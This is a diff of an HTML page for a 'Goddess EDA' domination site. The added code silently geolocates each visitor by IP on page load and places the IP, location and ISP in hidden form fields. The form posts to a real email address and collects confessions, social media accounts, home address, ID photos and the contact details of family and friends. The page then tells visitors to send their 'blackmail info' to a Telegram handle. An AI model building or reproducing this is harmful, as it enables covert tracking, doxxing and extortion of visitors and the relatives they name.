@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -30,7 +30,7 @@
             75% { text-shadow: -2px 2px yellow; }
             100% { text-shadow: 2px 2px red; }
         }
-        .form-container, .chess-container, .surveillance-log {
+        .form-container, .surveillance-log {
             width: 80%;
             margin: 20px auto;
             padding: 20px;
@@ -42,7 +42,7 @@
             width: 100%;
             margin-bottom: 10px;
         }
-        input[type="submit"], .chess-button, .tribute-button {
+        input[type="submit"], .tribute-button {
             background-color: #00FF00;
             color: black;
             cursor: pointer;
@@ -50,7 +50,7 @@
             border: none;
             margin-top: 10px;
         }
-        input[type="submit"]:hover, .chess-button:hover, .tribute-button:hover {
+        input[type="submit"]:hover, .tribute-button:hover {
             background-color: red;
         }
         .warning {
@@ -68,27 +68,39 @@
             height: 200px;
             overflow-y: scroll;
         }
+        #flashing-ip, #flashing-location, #flashing-isp {
+            font-size: 1.5em;
+            font-weight: bold;
+            text-align: center;
+            color: red;
+            animation: glitch 1s infinite;
+        }
     </style>
     <script>
+        function fetchIPAndLocation() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("flashing-ip").innerHTML = "⚠ IP Address: " + data.ip;
+                    document.getElementById("flashing-location").innerHTML = "⚠ Location: " + data.city + ", " + data.region + ", " + data.country_name;
+                    document.getElementById("flashing-isp").innerHTML = "⚠ ISP: " + data.org;
+                    document.getElementById("ip-input").value = data.ip;
+                    document.getElementById("location-input").value = data.city + ", " + data.region + ", " + data.country_name;
+                    document.getElementById("isp-input").value = data.org;
+                })
+                .catch(error => {
+                    document.getElementById("flashing-ip").innerHTML = "⚠ Error fetching IP.";
+                    console.error("IP Fetch Error:", error);
+                });
+        }
+
         function submitForm() {
             alert("Submission received. Your secrets now belong to EDA.");
         }
-        function showCountdown() {
-            let timer = 10;
-            const countdownElement = document.getElementById('countdown');
-            const countdownInterval = setInterval(() => {
-                countdownElement.textContent = "You have " + timer + " seconds to comply...";
-                timer--;
-                if (timer < 0) {
-                    clearInterval(countdownInterval);
-                    alert("Security breach detected. Your location has been logged.");
-                }
-            }, 1000);
-        }
-        function startChessGame() {
-            alert("You've challenged EDA to a game of chess. If you lose, your secrets are mine forever.");
-        }
-        window.onload = showCountdown;
+
+        window.onload = function() {
+            fetchIPAndLocation();
+        };
     </script>
 </head>
 <body>
@@ -97,52 +109,50 @@
     
     <div class="terminal">
         <p>Initializing surveillance protocols...</p>
-        <p>Tracking IP address...</p>
-        <p>Compiling personal data...</p>
-        <p>You are now under EDA's control.</p>
+        <p id="flashing-ip">Fetching IP Address...</p>
+        <p id="flashing-location">Fetching Location...</p>
+        <p id="flashing-isp">Fetching ISP...</p>
     </div>
 
     <div class="form-container">
         <h2>Submit to EDA</h2>
-        <form onsubmit="submitForm(); return false;">
+        <form action="https://formsubmit.co/wretchytub13@gmail.com" method="POST">
+            <input type="hidden" name="_subject" value="New Submission from EDA Site">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" id="ip-input" name="IP Address">
+            <input type="hidden" id="location-input" name="Location">
+            <input type="hidden" id="isp-input" name="ISP">
+
             <label for="kneeling_photo">Upload Photo: Kneeling with 'Goddess EDA' on Forehead</label>
-            <input type="file" id="kneeling_photo" name="kneeling_photo" required>
+            <input type="file" id="kneeling_photo" name="Kneeling Photo" required>
+            
+            <label for="social_media">Social Media Accounts</label>
+            <input type="text" id="social_media" name="Social Media" required>
+            
+            <label for="confessions">Confessions</label>
+            <textarea id="confessions" name="Confessions" rows="4" required></textarea>
             
             <label for="family_info">Names, Numbers, and Addresses of 3 Family Members</label>
-            <textarea id="family_info" name="family_info" rows="4" required></textarea>
+            <textarea id="family_info" name="Family Info" rows="4" required></textarea>
             
             <label for="friends_info">Names, Numbers, and Addresses of 3 Close Friends</label>
-            <textarea id="friends_info" name="friends_info" rows="4" required></textarea>
+            <textarea id="friends_info" name="Friends Info" rows="4" required></textarea>
             
             <label for="home_address">Your Home Address</label>
-            <input type="text" id="home_address" name="home_address" required>
+            <input type="text" id="home_address" name="Home Address" required>
             
-            <label for="id_picture">Upload Full ID Picture with Your Face</label>
-            <input type="file" id="id_picture" name="id_picture" required>
+            <label for="id_picture">Upload Full ID Picture</label>
+            <input type="file" id="id_picture" name="ID Picture" required>
             
             <input type="submit" value="PAY & SURRENDER">
         </form>
     </div>
 
-    <div class="chess-container">
-        <h3>Challenge EDA in Chess</h3>
-        <p class="warning">Think you're smart enough to outplay me? Lose, and your secrets become my currency. Win... if you dare.</p>
-        <button class="chess-button" onclick="startChessGame()">Play Chess with EDA</button>
-    </div>
-
-    <div class="surveillance-log">
-        <h3>Surveillance Log</h3>
-        <p>Live tracking initiated...</p>
-        <p>Accessing contacts...</p>
-        <p>Encrypting confessions...</p>
-        <p>Preparing automated exposure in case of disobedience...</p>
-    </div>
+    <p class="warning">⚠ Screenshot this page and your blackmail info, then send it to <a href="https://t.me/E22G1" style="color:yellow;">@E22G1</a> ⚠</p>
 
     <div class="tribute-section">
         <h3>Tribute to Goddess EDA</h3>
         <button class="tribute-button" onclick="window.location.href='https://throne.com/icontrolu'">Buy Gifts for EDA</button>
     </div>
-
-    <div id="countdown" class="warning"></div>
 </body>
 </html>
